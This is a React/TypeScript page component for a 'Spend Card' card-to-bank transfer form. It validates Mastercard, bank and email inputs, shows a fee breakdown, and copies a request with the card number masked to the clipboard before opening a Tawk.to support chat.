import { useState, useMemo } from "react";
import { Link } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ArrowLeft, CreditCard, Building, AlertCircle, CheckCircle2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { Alert, AlertDescription } from "@/components/ui/alert";

// Mastercard validation: starts with 51-55 or 2221-2720
const isValidMastercard = (number: string): boolean => {
  const cleaned = number.replace(/\s/g, "");
  if (!/^\d{16}$/.test(cleaned)) return false;
  
  const prefix2 = parseInt(cleaned.substring(0, 2));
  const prefix4 = parseInt(cleaned.substring(0, 4));
  
  return (prefix2 >= 51 && prefix2 <= 55) || (prefix4 >= 2221 && prefix4 <= 2720);
};

const isValidExpiry = (expiry: string): boolean => {
  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) return false;
  
  const [month, year] = expiry.split("/").map(Number);
  const now = new Date();
  const currentYear = now.getFullYear() % 100;
  const currentMonth = now.getMonth() + 1;
  
  if (year < currentYear) return false;
  if (year === currentYear && month < currentMonth) return false;
  
  return true;
};

const formatCardNumber = (value: string): string => {
  const cleaned = value.replace(/\D/g, "").slice(0, 16);
  const groups = cleaned.match(/.{1,4}/g);
  return groups ? groups.join(" ") : cleaned;
};

const formatExpiry = (value: string): string => {
  const cleaned = value.replace(/\D/g, "").slice(0, 4);
  if (cleaned.length >= 2) {
    return cleaned.slice(0, 2) + "/" + cleaned.slice(2);
  }
  return cleaned;
};

const SpendCard = () => {
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Card details
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [amount, setAmount] = useState("");
  
  // Bank details
  const [bankName, setBankName] = useState("");
  const [accountHolderName, setAccountHolderName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  
  // Contact
  const [email, setEmail] = useState("");
  
  // Validation errors
  const [errors, setErrors] = useState<Record<string, string>>({});

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};
    
    if (!cardholderName.trim()) {
      newErrors.cardholderName = "Cardholder name is required";
    } else if (cardholderName.length > 100) {
      newErrors.cardholderName = "Name must be less than 100 characters";
    }
    
    const cleanedCardNumber = cardNumber.replace(/\s/g, "");
    if (!cleanedCardNumber) {
      newErrors.cardNumber = "Card number is required";
    } else if (!isValidMastercard(cleanedCardNumber)) {
      newErrors.cardNumber = "Must be a valid 16-digit Mastercard number";
    }
    
    if (!expiryDate) {
      newErrors.expiryDate = "Expiry date is required";
    } else if (!isValidExpiry(expiryDate)) {
      newErrors.expiryDate = "Invalid or expired date (MM/YY)";
    }
    
    if (!cvv) {
      newErrors.cvv = "CVV is required";
    } else if (!/^\d{3}$/.test(cvv)) {
      newErrors.cvv = "CVV must be 3 digits";
    }
    
    const amountNum = parseFloat(amount);
    if (!amount) {
      newErrors.amount = "Amount is required";
    } else if (isNaN(amountNum) || amountNum <= 0) {
      newErrors.amount = "Amount must be a positive number";
    }
    
    if (!bankName.trim()) {
      newErrors.bankName = "Bank name is required";
    }
    
    if (!accountHolderName.trim()) {
      newErrors.accountHolderName = "Account holder name is required";
    }
    
    if (!accountNumber.trim()) {
      newErrors.accountNumber = "Account number is required";
    } else if (accountNumber.length < 5 || accountNumber.length > 34) {
      newErrors.accountNumber = "Account number must be 5-34 characters";
    }
    
    if (!email.trim()) {
      newErrors.email = "Email is required";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      newErrors.email = "Invalid email address";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      toast({
        title: "Validation Error",
        description: "Please fix the errors in the form",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);
    
    try {
      const cleanedCardNumber = cardNumber.replace(/\s/g, "");
      const maskedCard = `XXXX-XXXX-XXXX-${cleanedCardNumber.slice(-4)}`;
      
      const message = `
🔵 SPEND CARD REQUEST 🔵
━━━━━━━━━━━━━━━━━━━━━━

💳 CARD DETAILS
• Cardholder: ${cardholderName.trim()}
• Card Number: ${maskedCard}
• Expiry: ${expiryDate}
• CVV: ***

💰 TRANSFER AMOUNT
• Amount: $${parseFloat(amount).toFixed(2)} USD

🏦 BANK DETAILS
• Bank Name: ${bankName.trim()}
• Account Holder: ${accountHolderName.trim()}
• Account Number: ${accountNumber.trim()}
${routingNumber.trim() ? `• Routing/SWIFT: ${routingNumber.trim()}` : ""}

📧 CONTACT
• Email: ${email.trim()}

━━━━━━━━━━━━━━━━━━━━━━
Please process this card-to-bank transfer request.
      `.trim();
      
      await navigator.clipboard.writeText(message);
      
      // Open Tawk.to chat
      if (typeof window !== "undefined" && (window as any).Tawk_API) {
        const tawk = (window as any).Tawk_API;
        
        if (tawk.setAttributes) {
          tawk.setAttributes({
            name: cardholderName.trim(),
            email: email.trim(),
          });
        }
        
        if (tawk.maximize) {
          tawk.maximize();
        }
        
        toast({
          title: "Details Copied!",
          description: "Your spend card details have been copied. Please paste them in the chat window that just opened.",
        });
      } else {
        toast({
          title: "Details Copied!",
          description: "Your spend card details have been copied to clipboard. Please open our support chat and paste them to continue.",
        });
      }
      
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to process your request. Please try again.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b border-border bg-card/50">
        <div className="container mx-auto flex items-center gap-4 px-4 py-4">
          <Button variant="ghost" size="icon" asChild>
            <Link to="/">
              <ArrowLeft className="h-5 w-5" />
            </Link>
          </Button>
          <div>
            <h1 className="text-2xl font-bold">SPEND CARD</h1>
            <p className="text-sm text-muted-foreground">Transfer funds from your Mastercard to a bank account</p>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <div className="mx-auto max-w-2xl">
          {/* Info Alert */}
          <Alert className="mb-6 border-primary/50 bg-primary/10">
            <CreditCard className="h-4 w-4" />
            <AlertDescription className="flex items-center gap-2">
              <span className="font-semibold">Only Mastercard accepted.</span>
              Transfer funds from your Mastercard to any bank account worldwide.
            </AlertDescription>
          </Alert>

          <Card className="border-border bg-card p-6">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Card Details Section */}
              <div className="space-y-4">
                <div className="flex items-center gap-2 border-b border-border pb-2">
                  <CreditCard className="h-5 w-5 text-primary" />
                  <h2 className="text-lg font-semibold">Card Details</h2>
                  <div className="ml-auto flex items-center gap-1 rounded bg-muted px-2 py-1 text-xs">
                    <span className="font-medium">Mastercard Only</span>
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cardholderName">Cardholder Name</Label>
                  <Input
                    id="cardholderName"
                    placeholder="Name as shown on card"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    className={errors.cardholderName ? "border-destructive" : ""}
                  />
                  {errors.cardholderName && (
                    <p className="text-sm text-destructive">{errors.cardholderName}</p>
                  )}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cardNumber">Card Number</Label>
                  <Input
                    id="cardNumber"
                    placeholder="5XXX XXXX XXXX XXXX"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                    className={errors.cardNumber ? "border-destructive" : ""}
                  />
                  {errors.cardNumber && (
                    <p className="text-sm text-destructive">{errors.cardNumber}</p>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate">Expiry Date</Label>
                    <Input
                      id="expiryDate"
                      placeholder="MM/YY"
                      value={expiryDate}
                      onChange={(e) => setExpiryDate(formatExpiry(e.target.value))}
                      className={errors.expiryDate ? "border-destructive" : ""}
                    />
                    {errors.expiryDate && (
                      <p className="text-sm text-destructive">{errors.expiryDate}</p>
                    )}
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="cvv">CVV</Label>
                    <Input
                      id="cvv"
                      placeholder="123"
                      type="password"
                      maxLength={3}
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                      className={errors.cvv ? "border-destructive" : ""}
                    />
                    {errors.cvv && (
                      <p className="text-sm text-destructive">{errors.cvv}</p>
                    )}
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="amount">Amount (USD)</Label>
                  <Input
                    id="amount"
                    placeholder="100.00"
                    type="number"
                    step="0.01"
                    min="0"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className={errors.amount ? "border-destructive" : ""}
                  />
                  {errors.amount && (
                    <p className="text-sm text-destructive">{errors.amount}</p>
                  )}
                </div>

                {/* Fee Breakdown Display */}
                {(() => {
                  const amountNum = parseFloat(amount);
                  if (isNaN(amountNum) || amountNum <= 0) return null;
                  
                  const processingFeeRate = 0.025;
                  const minProcessingFee = 2.50;
                  const serviceFee = 1.00;
                  
                  const processingFee = Math.max(amountNum * processingFeeRate, minProcessingFee);
                  const totalFees = processingFee + serviceFee;
                  const amountReceived = amountNum - totalFees;

                  if (amountReceived <= 0) return null;

                  return (
                    <div className="mt-4 rounded-lg border border-border bg-muted/50 p-4">
                      <h4 className="mb-3 text-sm font-medium text-foreground">Fee Breakdown</h4>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between text-muted-foreground">
                          <span>Transfer Amount</span>
                          <span className="text-foreground">${amountNum.toFixed(2)}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Processing Fee (2.5%)</span>
                          <span className="text-amber-500">-${processingFee.toFixed(2)}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Service Fee</span>
                          <span className="text-amber-500">-${serviceFee.toFixed(2)}</span>
                        </div>
                        <div className="flex justify-between border-t border-border pt-2 font-semibold">
                          <span className="text-foreground">Amount You'll Receive</span>
                          <span className="text-green-500">${amountReceived.toFixed(2)}</span>
                        </div>
                      </div>
                    </div>
                  );
                })()}
              </div>

              {/* Bank Details Section */}
              <div className="space-y-4">
                <div className="flex items-center gap-2 border-b border-border pb-2">
                  <Building className="h-5 w-5 text-accent" />
                  <h2 className="text-lg font-semibold">Bank Details</h2>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="bankName">Bank Name</Label>
                  <Input
                    id="bankName"
                    placeholder="e.g., Chase, Bank of America"
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    className={errors.bankName ? "border-destructive" : ""}
                  />
                  {errors.bankName && (
                    <p className="text-sm text-destructive">{errors.bankName}</p>
                  )}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="accountHolderName">Account Holder Name</Label>
                  <Input
                    id="accountHolderName"
                    placeholder="Name on bank account"
                    value={accountHolderName}
                    onChange={(e) => setAccountHolderName(e.target.value)}
                    className={errors.accountHolderName ? "border-destructive" : ""}
                  />
                  {errors.accountHolderName && (
                    <p className="text-sm text-destructive">{errors.accountHolderName}</p>
                  )}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="accountNumber">Account Number / IBAN</Label>
                  <Input
                    id="accountNumber"
                    placeholder="Enter account number or IBAN"
                    value={accountNumber}
                    onChange={(e) => setAccountNumber(e.target.value)}
                    className={errors.accountNumber ? "border-destructive" : ""}
                  />
                  {errors.accountNumber && (
                    <p className="text-sm text-destructive">{errors.accountNumber}</p>
                  )}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="routingNumber">Routing Number / SWIFT Code (Optional)</Label>
                  <Input
                    id="routingNumber"
                    placeholder="For US banks: 9-digit routing number"
                    value={routingNumber}
                    onChange={(e) => setRoutingNumber(e.target.value)}
                  />
                </div>
              </div>

              {/* Contact Section */}
              <div className="space-y-4">
                <div className="flex items-center gap-2 border-b border-border pb-2">
                  <AlertCircle className="h-5 w-5 text-primary" />
                  <h2 className="text-lg font-semibold">Contact Information</h2>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input
                    id="email"
                    type="email"
                    placeholder="your@email.com"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className={errors.email ? "border-destructive" : ""}
                  />
                  {errors.email && (
                    <p className="text-sm text-destructive">{errors.email}</p>
                  )}
                </div>
              </div>

              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full"
                size="lg"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  "Processing..."
                ) : (
                  <>
                    <CheckCircle2 className="mr-2 h-5 w-5" />
                    Submit Spend Card Request
                  </>
                )}
              </Button>

              {/* Instructions */}
              <Alert className="border-muted bg-muted/50">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>
                  <strong>How it works:</strong> After submitting, your details will be copied to your clipboard. 
                  A chat window will open where you can paste your request. Our support team will process your 
                  card-to-bank transfer within 24 hours.
                </AlertDescription>
              </Alert>
            </form>
          </Card>
        </div>
      </main>
    </div>
  );
};

export default SpendCard;
